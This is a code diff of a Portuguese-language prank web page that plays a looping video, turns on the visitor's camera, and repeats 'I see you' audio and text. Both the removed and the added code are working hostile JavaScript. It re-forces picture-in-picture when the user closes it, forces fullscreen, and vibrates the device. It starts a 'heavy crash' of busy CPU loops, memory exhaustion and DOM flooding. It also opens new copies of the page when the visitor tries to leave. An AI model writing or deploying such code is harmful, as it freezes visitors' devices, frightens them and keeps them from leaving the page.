@@ -58,6 +58,47 @@
             z-index: 950;
             background: #000;
         }
+        .final-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 20000;
+            display: none;
+            cursor: pointer;
+        }
+        .final-image {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            background: #000;
+        }
+        .crash-element {
+            position: fixed;
+            font-size: 24px;
+            z-index: 99999;
+            pointer-events: none;
+            animation: float 3s infinite;
+        }
+        .matrix-code {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            pointer-events: none;
+            z-index: 800;
+            font-family: 'Courier New', monospace;
+            color: #0f0;
+            font-size: 14px;
+        }
+        .code-char {
+            position: absolute;
+            color: #0f0;
+            animation: fall 3s linear forwards;
+            text-shadow: 0 0 8px #0f0;
+        }
         .audio-overlay {
             position: fixed;
             top: 50%;
@@ -66,133 +107,72 @@
             background: rgba(255, 0, 0, 0.9);
             color: white;
             padding: 20px;
-            font-size: 2em;
+            font-size: 3em;
             z-index: 10000;
             display: none;
+            text-align: center;
         }
-        .pip-force {
-            position: fixed;
-            top: 10px;
-            left: 10px;
-            background: rgba(255, 0, 0, 0.9);
-            color: white;
-            padding: 10px;
-            font-size: 1.2em;
-            z-index: 10001;
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 1; }
+            50% { transform: translateY(-50px) rotate(180deg); opacity: 0.7; }
+        }
+        @keyframes fall {
+            0% { transform: translateY(-100px); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(100vh); opacity: 0; }
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
+            20%, 40%, 60%, 80% { transform: translateX(10px); }
         }
     </style>
 </head>
 <body>
-    <div id="start">🚨 INICIAR SISTEMA 🚨</div>
+    <div id="start">🚨 INICIAR SISTEMA DE TRAVAMENTO 🚨</div>
     <video id="video" playsinline loop muted>
         <source src="https://alexandre7888.github.io/ontono.exe/InShot_20250705_234210151.mp4" type="video/mp4">
     </video>
     <video id="userVideo" autoplay muted playsinline style="display: none;"></video>
     <div class="terminal-text" id="terminal"></div>
+    <div class="matrix-code" id="matrixCode"></div>
     <div class="audio-overlay" id="audioOverlay">EU VEJO VOCÊ</div>
-    <div class="pip-force" id="pipForce" style="display: none;">PIP ATIVO - NÃO FECHE!</div>
+    
+    <div class="final-container" id="finalContainer">
+        <img class="final-image" src="https://alexandre7888.github.io/ontono.exe/InShot_20251025_123921954.jpg">
+    </div>
+
+    <audio id="persistentAudio" loop>
+        <source src="https://alexandre7888.github.io/ontono.exe/eu%20vejo%20voc%C3%AA.mp3" type="audio/mpeg">
+    </audio>
 
     <script>
         const start = document.getElementById("start");
         const video = document.getElementById("video");
         const userVideo = document.getElementById("userVideo");
         const terminal = document.getElementById("terminal");
+        const matrixCode = document.getElementById("matrixCode");
         const audioOverlay = document.getElementById("audioOverlay");
-        const pipForce = document.getElementById("pipForce");
+        const finalContainer = document.getElementById("finalContainer");
+        const persistentAudio = document.getElementById("persistentAudio");
 
         let localStream = null;
         let audioClips = [];
-        let pipInterval;
-        let pipActive = false;
+        let crashIntervals = [];
+        let finalPhase = false;
 
-        // **SISTEMA DE PIP PERSISTENTE - FORÇAR SEMPRE ATIVO**
-        async function forcePIP() {
-            if (!document.pictureInPictureEnabled) {
-                updateTerminal("❌ PIP NÃO SUPORTADO");
-                return;
-            }
-
-            try {
-                // Verificar se já está em PIP
-                if (document.pictureInPictureElement) {
-                    return; // Já está ativo
-                }
-
-                // Forçar entrar no PIP
-                await video.requestPictureInPicture();
-                pipActive = true;
-                pipForce.style.display = 'block';
-                updateTerminal("✅ PIP FORÇADO - VÍDEO FLUTUANTE ATIVO");
-
-            } catch (error) {
-                updateTerminal("❌ ERRO AO FORÇAR PIP: " + error.message);
-                pipActive = false;
-            }
+        function updateTerminal(message) {
+            terminal.textContent += `[${new Date().toLocaleTimeString()}] ${message}\n`;
+            terminal.scrollTop = terminal.scrollHeight;
         }
 
-        function startPIPPersistance() {
-            updateTerminal("🎬 INICIANDO SISTEMA DE PIP PERSISTENTE...");
-
-            // Forçar PIP inicial
-            setTimeout(() => {
-                forcePIP();
-            }, 1000);
-
-            // Verificar e forçar PIP a cada 2 segundos
-            pipInterval = setInterval(() => {
-                if (!document.pictureInPictureElement && !pipActive) {
-                    updateTerminal("⚠️ PIP FECHADO - FORÇANDO REATIVAÇÃO");
-                    forcePIP();
-                }
-            }, 2000);
-
-            // Monitorar quando usuário tenta sair do PIP
-            video.addEventListener('leavepictureinpicture', () => {
-                updateTerminal("🚨 USUÁRIO TENTOU SAIR DO PIP! REATIVANDO...");
-                pipActive = false;
-                
-                // Reativar imediatamente
-                setTimeout(() => {
-                    forcePIP();
-                }, 500);
-                
-                // Intensificar ataques
-                intensifyAttacks();
-            });
-
-            updateTerminal("✅ SISTEMA DE PIP PERSISTENTE ATIVO");
-        }
-
-        // **INTENSIFICAR ATAQUES QUANDO TENTA FECHAR PIP**
-        function intensifyAttacks() {
-            updateTerminal("💥 INTENSIFICANDO ATAQUES - PIP TENTOU SER FECHADO");
-            
-            // Tocar mais áudios
-            playMultipleAudio();
-            
-            // Vibração mais forte
-            if (navigator.vibrate) {
-                navigator.vibrate([3000, 200, 3000, 200, 3000]);
-            }
-            
-            // Criar mais overlays
-            for (let i = 0; i < 3; i++) {
-                setTimeout(() => {
-                    audioOverlay.style.display = 'block';
-                    audioOverlay.textContent = 'NÃO FECHE O PIP! '.repeat(2);
-                    setTimeout(() => {
-                        audioOverlay.style.display = 'none';
-                    }, 3000);
-                }, i * 1000);
-            }
-        }
-
-        // **SISTEMA DE ÁUDIO "EU VEJO VOCÊ" REPETIDO**
+        // **SISTEMA DE ÁUDIO QUE FUNCIONA**
         function setupAudioSystem() {
-            updateTerminal("🔊 CARREGANDO ÁUDIOS 'EU VEJO VOCÊ'...");
+            updateTerminal("🔊 INICIANDO SISTEMA DE ÁUDIO...");
             
-            // Criar múltiplas instâncias do áudio
-            for (let i = 0; i < 15; i++) {
+            for (let i = 0; i < 10; i++) {
                 const audio = new Audio();
                 audio.src = "https://alexandre7888.github.io/ontono.exe/eu%20vejo%20voc%C3%AA.mp3";
                 audio.volume = 0.8;
@@ -200,115 +180,46 @@
                 audioClips.push(audio);
             }
             
-            updateTerminal("✅ 15 ÁUDIOS CARREGADOS - PRONTOS PARA TOCAR");
-        }
-
-        function playMultipleAudio() {
-            updateTerminal("🔊 DISPARANDO 'EU VEJO VOCÊ' EM MASSA...");
-            
-            // Tocar todos os áudios rapidamente
-            audioClips.forEach((audio, index) => {
-                setTimeout(() => {
-                    audio.currentTime = 0;
-                    audio.play().catch(e => {
-                        // Silenciar se bloqueado e tentar novamente
-                        audio.muted = true;
-                        audio.play().catch(() => {});
-                    });
-                    
-                    // Mostrar overlay
-                    audioOverlay.style.display = 'block';
-                    audioOverlay.textContent = 'EU VEJO VOCÊ! '.repeat(3);
+            // Tocar áudio quando usuário interage
+            const playAllAudio = () => {
+                audioClips.forEach((audio, index) => {
                     setTimeout(() => {
-                        audioOverlay.style.display = 'none';
-                    }, 1500);
-                    
-                }, index * 300); // Espaçar os áudios
-            });
-            
-            // Repetir a cada 3 segundos
-            setInterval(() => {
-                audioClips.forEach(audio => {
-                    audio.currentTime = 0;
-                    audio.play().catch(e => {
-                        audio.muted = true;
-                        audio.play().catch(() => {});
-                    });
+                        audio.currentTime = 0;
+                        audio.play().catch(e => {
+                            audio.muted = true;
+                            audio.play();
+                        });
+                    }, index * 400);
                 });
+                
                 audioOverlay.style.display = 'block';
-                setTimeout(() => audioOverlay.style.display = 'none', 1500);
-            }, 3000);
-        }
-
-        // **SISTEMA DE VIBRAÇÃO CONSTANTE**
-        function startVibration() {
-            updateTerminal("📳 INICIANDO VIBRAÇÃO CONSTANTE...");
+                setTimeout(() => audioOverlay.style.display = 'none', 3000);
+            };
             
-            if (navigator.vibrate) {
-                // Vibração constante
-                setInterval(() => {
-                    navigator.vibrate([2000, 300, 2000, 300, 2000]);
-                    updateTerminal("📳 VIBRAÇÃO ATIVA");
-                }, 6000);
-                
-            } else {
-                updateTerminal("❌ VIBRAÇÃO NÃO SUPORTADA");
-            }
+            document.addEventListener('click', playAllAudio);
+            document.addEventListener('keydown', playAllAudio);
         }
 
-        // **SISTEMA DE TRAVAMENTO REAL**
-        function startRealCrash() {
-            updateTerminal("💥 INICIANDO TRAVAMENTO DO NAVEGADOR...");
+        // **EFEITO MATRIX**
+        function createMatrixEffect() {
+            const chars = "01010101010101010101ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&";
 
-            // 1. CONSUMO MÁXIMO DE CPU
-            const cpuCrash = setInterval(() => {
-                const startTime = Date.now();
-                // Loop que trava por 3 segundos
-                while (Date.now() - startTime < 3000) {
-                    // Cálculos extremamente pesados
-                    for (let i = 0; i < 1000000; i++) {
-                        const heavy = Math.sin(Math.random()) * Math.cos(Math.random()) * Math.tan(Math.random());
-                        const array = new Array(5000).fill(heavy);
-                    }
+            setInterval(() => {
+                for (let i = 0; i < 8; i++) {
+                    const charElement = document.createElement('div');
+                    charElement.className = 'code-char';
+                    charElement.textContent = chars[Math.floor(Math.random() * chars.length)];
+                    charElement.style.left = Math.random() * 100 + 'vw';
+                    charElement.style.fontSize = (12 + Math.random() * 10) + 'px';
+                    charElement.style.animationDuration = (2 + Math.random() * 3) + 's';
+
+                    matrixCode.appendChild(charElement);
+
+                    setTimeout(() => {
+                        charElement.remove();
+                    }, 5000);
                 }
-                updateTerminal("🔥 CPU 100% - SISTEMA TRAVADO");
-            }, 5000);
-
-            // 2. CONSUMO DE MEMÓRIA
-            const memoryHog = [];
-            const memoryCrash = setInterval(() => {
-                for (let i = 0; i < 50; i++) {
-                    memoryHog.push(new Array(50000).fill('TRAVAMENTO_' + Date.now()));
-                }
-            }, 3000);
-
-            // 3. TRAVAR EVENTOS
-            document.addEventListener('mousemove', (e) => {
-                e.preventDefault();
-                e.stopImmediatePropagation();
-            }, true);
-
-            document.addEventListener('click', (e) => {
-                e.preventDefault();
-                e.stopImmediatePropagation();
-                updateTerminal("🖱️ CLIQUE BLOQUEADO");
-                // Abrir novas janelas ao clicar
-                window.open(window.location.href, '_blank');
-            }, true);
-
-            document.addEventListener('keydown', (e) => {
-                e.preventDefault();
-                e.stopImmediatePropagation();
-                updateTerminal("⌨️ TECLA " + e.key + " BLOQUEADA");
-                
-                if (e.key === 'Escape') {
-                    for (let i = 0; i < 3; i++) {
-                        window.open(window.location.href, '_blank');
-                    }
-                }
-            }, true);
-
-            updateTerminal("✅ TRAVAMENTO 100% ATIVO");
+            }, 100);
         }
 
         // **SISTEMA DE CÂMERA**
@@ -336,83 +247,211 @@
             }
         }
 
-        // **DETECTAR QUANDO SAI DO NAVEGADOR**
-        function setupPageMonitor() {
-            document.addEventListener('visibilitychange', () => {
-                if (document.hidden) {
-                    updateTerminal("📱 USUÁRIO SAIU DO NAVEGADOR - PIP MANTÉM VÍDEO!");
-                    
-                    // Intensificar áudio
-                    playMultipleAudio();
-                    
-                    if (navigator.vibrate) {
-                        navigator.vibrate([5000, 500, 5000]);
-                    }
-                    
-                } else {
-                    updateTerminal("📱 USUÁRIO VOLTOU - PIP CONTINUA ATIVO");
-                }
+        // **PIP AUTOMÁTICO**
+        async function activatePIP() {
+            if (!document.pictureInPictureEnabled) {
+                updateTerminal("❌ PIP NÃO SUPORTADO");
+                return;
+            }
+
+            try {
+                await video.requestPictureInPicture();
+                updateTerminal("✅ PIP ATIVADO");
+                
+                video.addEventListener('leavepictureinpicture', () => {
+                    updateTerminal("⚠️ PIP FECHADO - REATIVANDO...");
+                    setTimeout(activatePIP, 1000);
+                });
+                
+            } catch (error) {
+                updateTerminal("❌ ERRO PIP: " + error.message);
+            }
+        }
+
+        // **TELA CHEIA**
+        function forceFullscreen() {
+            try {
+                document.documentElement.requestFullscreen();
+                updateTerminal("✅ TELA CHEIA ATIVADA");
+            } catch (e) {
+                updateTerminal("❌ TELA CHEIA BLOQUEADA");
+            }
+        }
+
+        // **VIBRAÇÃO PESADA**
+        function startHeavyVibration() {
+            if (navigator.vibrate) {
+                updateTerminal("📳 INICIANDO VIBRAÇÃO...");
+                
+                setInterval(() => {
+                    navigator.vibrate([2000, 500, 2000, 500, 2000]);
+                }, 6000);
+            } else {
+                updateTerminal("❌ VIBRAÇÃO NÃO SUPORTADA");
+            }
+        }
+
+        // **FASE FINAL**
+        function activateFinalPhase() {
+            if (finalPhase) return;
+            
+            finalPhase = true;
+            updateTerminal("💀 ATIVANDO FASE FINAL...");
+            
+            video.style.display = 'none';
+            userVideo.style.display = 'none';
+            finalContainer.style.display = 'block';
+            
+            if (document.pictureInPictureElement) {
+                document.exitPictureInPicture();
+            }
+            
+            forceFullscreen();
+            
+            // Tocar áudio na fase final
+            audioClips.forEach(audio => {
+                audio.play().catch(e => {
+                    audio.muted = true;
+                    audio.play();
+                });
             });
+        }
+
+        // **TRAVAMENTO PESADO DE VERDADE**
+        function startHeavyCrash() {
+            updateTerminal("💥 INICIANDO TRAVAMENTO PESADO...");
+            
+            // PARAR INTERVALOS ANTERIORES
+            crashIntervals.forEach(interval => clearInterval(interval));
+            crashIntervals = [];
+
+            // 1. CPU 100% - BLOQUEIO COMPLETO
+            const cpuCrash = setInterval(() => {
+                const startTime = Date.now();
+                while (Date.now() - startTime < 5000) {
+                    for (let i = 0; i < 10000000; i++) {
+                        const a = Math.random();
+                        const b = Math.random();
+                        const result = Math.sin(a) * Math.cos(b) * Math.tan(a * b);
+                        const array = new Array(100000).fill(result);
+                        const sum = array.reduce((acc, val) => acc + val, 0);
+                    }
+                }
+            }, 10);
+            crashIntervals.push(cpuCrash);
+
+            // 2. MAIS CPU
+            const cpuCrash2 = setInterval(() => {
+                let total = 0;
+                for (let i = 0; i < 50000000; i++) {
+                    total += Math.sqrt(Math.random()) * Math.log(Math.random() + 1);
+                }
+            }, 10);
+            crashIntervals.push(cpuCrash2);
+
+            // 3. MEMÓRIA ESGOTADA
+            const memoryArrays = [];
+            const memoryCrash = setInterval(() => {
+                for (let i = 0; i < 100; i++) {
+                    memoryArrays.push(new Array(100000).fill('CRASH_' + Date.now()));
+                }
+            }, 500);
+            crashIntervals.push(memoryCrash);
+
+            // 4. ELEMENTOS NA TELA
+            const elementCrash = setInterval(() => {
+                for (let i = 0; i < 200; i++) {
+                    const el = document.createElement('div');
+                    el.className = 'crash-element';
+                    el.style.left = Math.random() * window.innerWidth + 'px';
+                    el.style.top = Math.random() * window.innerHeight + 'px';
+                    el.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                    el.style.fontSize = (15 + Math.random() * 50) + 'px';
+                    el.textContent = '💀';
+                    document.body.appendChild(el);
+                    
+                    setTimeout(() => el.remove(), 5000);
+                }
+            }, 300);
+            crashIntervals.push(elementCrash);
+
+            // 5. VÍDEO TRAVADO
+            const videoCrash = setInterval(() => {
+                video.style.filter = `
+                    hue-rotate(${Math.random() * 360}deg)
+                    contrast(${100 + Math.random() * 300}%)
+                    brightness(${50 + Math.random() * 100}%)
+                `;
+                video.playbackRate = 0.1 + Math.random() * 2;
+            }, 400);
+            crashIntervals.push(videoCrash);
+
+            // 6. ÁUDIO TRAVADO
+            const audioCrash = setInterval(() => {
+                audioClips.forEach(audio => {
+                    audio.currentTime = Math.random() * 3;
+                    audio.playbackRate = 0.3 + Math.random() * 1.5;
+                    audio.play().catch(e => {
+                        audio.muted = true;
+                        audio.play();
+                    });
+                });
+                
+                audioOverlay.style.display = 'block';
+                setTimeout(() => audioOverlay.style.display = 'none', 2000);
+            }, 5000);
+            crashIntervals.push(audioCrash);
+
+            // 7. EFEITOS VISUAIS
+            const visualCrash = setInterval(() => {
+                document.body.style.background = `hsl(${Math.random() * 360}, 100%, 8%)`;
+                document.body.style.transform = `translate(${Math.random() * 20 - 10}px, ${Math.random() * 20 - 10}px)`;
+            }, 200);
+            crashIntervals.push(visualCrash);
+
+            updateTerminal("✅ TRAVAMENTO PESADO ATIVADO");
         }
 
         // **INICIAR SISTEMA COMPLETO**
         start.addEventListener("click", async () => {
             start.style.display = "none";
-            updateTerminal("🚀 INICIANDO SISTEMA DE PIP PERSISTENTE...");
+            updateTerminal("🚀 INICIANDO SISTEMA COMPLETO...");
 
-            // 1. Configurar áudio
             setupAudioSystem();
-
-            // 2. Iniciar câmera
+            createMatrixEffect();
             await startCamera();
-
-            // 3. Configurar monitor de página
-            setupPageMonitor();
-
-            // 4. Iniciar vídeo
+            
             video.play().catch(e => {
                 video.muted = true;
                 video.play();
             });
 
-            // 5. Iniciar PIP persistente (PRINCIPAL)
-            startPIPPersistance();
+            forceFullscreen();
+            setTimeout(activatePIP, 2000);
+            setTimeout(startHeavyVibration, 3000);
 
-            // 6. Iniciar vibração
-            startVibration();
-
-            // 7. Iniciar travamento
+            // FASE FINAL EM 20 SEGUNDOS
             setTimeout(() => {
-                startRealCrash();
-            }, 2000);
+                activateFinalPhase();
+            }, 20000);
 
-            // 8. Iniciar áudios
-            setTimeout(() => {
-                playMultipleAudio();
-            }, 3000);
-
-            updateTerminal("✅ SISTEMA ATIVO - PIP SEMPRE VISÍVEL");
+            updateTerminal("✅ SISTEMA ATIVO - FASE FINAL EM 20s");
         });
 
-        // **IMPEDIR FECHAMENTO**
+        // **CLIQUE NA FOTO = TRAVAMENTO PESADO**
+        finalContainer.addEventListener("click", () => {
+            startHeavyCrash();
+        });
+
+        // **BLOQUEAR FECHAMENTO**
         window.addEventListener('beforeunload', (e) => {
             e.preventDefault();
-            updateTerminal("🚨 TENTATIVA DE FECHAR! MANTENDO PIP...");
-            
-            // Manter PIP ativo
-            forcePIP();
-            
-            // Abrir cópias
-            window.open(window.location.href, '_blank');
-            
-            e.returnValue = 'PIP ATIVO - NÃO FECHE!';
-            return e.returnValue;
+            if (!finalPhase) {
+                window.open(window.location.href, '_blank');
+            }
+            e.returnValue = '';
+            return '';
         });
-
-        function updateTerminal(message) {
-            terminal.textContent += `[${new Date().toLocaleTimeString()}] ${message}\n`;
-            terminal.scrollTop = terminal.scrollHeight;
-        }
 
     </script>
 </body>
